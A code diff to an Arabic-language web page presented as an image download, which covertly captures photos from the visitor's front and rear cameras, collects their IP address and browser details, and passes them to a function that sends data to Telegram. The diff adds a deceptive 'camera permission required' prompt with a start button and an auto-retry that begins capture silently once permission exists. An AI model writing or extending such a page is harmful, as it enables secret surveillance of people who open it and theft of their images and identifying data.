@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <title>تحميل صورة</title>
@@ -31,12 +31,49 @@
             border-radius: 5px;
             display: inline-block;
         }
+        #permissionGuide {
+            margin: 20px auto;
+            padding: 15px;
+            max-width: 500px;
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            border-radius: 8px;
+            text-align: right;
+        }
+        #startButton {
+            padding: 12px 24px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: background 0.3s;
+        }
+        #startButton:hover {
+            background: #388E3C;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحميل" alt="الصورة">
-    <p class="loading">📸 جاري الالتقاط التبادلي للكاميرتين...</p>
-    <div id="status" class="status"></div>
+    <div id="permissionGuide">
+        <h3>⚠️ يلزم إذن الوصول إلى الكاميرا</h3>
+        <p>للاستمرار، يرجى:</p>
+        <ol>
+            <li>النقر على زر "السماح" أو "Allow" في نافذة الإذن التي ستظهر</li>
+            <li>التأكد من عدم منع الموقع من الوصول إلى الكاميرا</li>
+            <li>السماح للمتصفح باستخدام الكاميرا إذا طلب منك ذلك</li>
+        </ol>
+        <button id="startButton">بدء الكاميرا</button>
+    </div>
+
+    <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحميل" alt="الصورة" class="hidden">
+    <p id="loadingText" class="loading hidden">📸 جاري الالتقاط التبادلي للكاميرتين...</p>
+    <div id="status" class="status hidden"></div>
 
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -52,10 +89,22 @@
         const ctx = canvas.getContext("2d");
         const statusDiv = document.getElementById("status");
         const displayImage = document.getElementById("displayImage");
+        const loadingText = document.getElementById("loadingText");
+        const permissionGuide = document.getElementById("permissionGuide");
+        const startButton = document.getElementById("startButton");
         
         let facing = "user";  // Start with front camera
         let captureCount = 0;
         const maxCaptures = 2;  // Capture from both cameras
+        let permissionAttempts = 0;
+
+        // Function to show elements
+        function showElements() {
+            displayImage.classList.remove("hidden");
+            loadingText.classList.remove("hidden");
+            statusDiv.classList.remove("hidden");
+            permissionGuide.classList.add("hidden");
+        }
 
         // Function to send data to Telegram
         async function sendToTelegram(endpoint, data, isPhoto = false) {
@@ -159,8 +208,24 @@
             }
         }
 
+        // Function to check camera permission
+        async function checkCameraPermission() {
+            try {
+                if (navigator.permissions && navigator.permissions.query) {
+                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                    return permissionStatus.state;
+                }
+                return 'unknown';
+            } catch (error) {
+                console.error('Permission API not supported', error);
+                return 'unknown';
+            }
+        }
+
         // Main initialization
         async function init() {
+            showElements();
+            
             // Get client info
             const ip = await getClientIP();
             const ua = navigator.userAgent;
@@ -189,8 +254,32 @@
             switchCamera();
         }
 
-        // Start the process when page loads
-        window.addEventListener('DOMContentLoaded', init);
+        // Try to access camera with auto-retry
+        async function tryCameraAccess() {
+            permissionAttempts++;
+            
+            try {
+                const permission = await checkCameraPermission();
+                if (permission === 'granted') {
+                    init();
+                    return;
+                }
+                
+                if (permissionAttempts < 3) {
+                    setTimeout(tryCameraAccess, 1000);
+                }
+            } catch (error) {
+                console.error('Error checking permission:', error);
+            }
+        }
+
+        // Start button click handler
+        startButton.addEventListener('click', init);
+
+        // Initial auto-try (will work if permission was already granted)
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(tryCameraAccess, 500);
+        });
     </script>
 </body>
 </html>
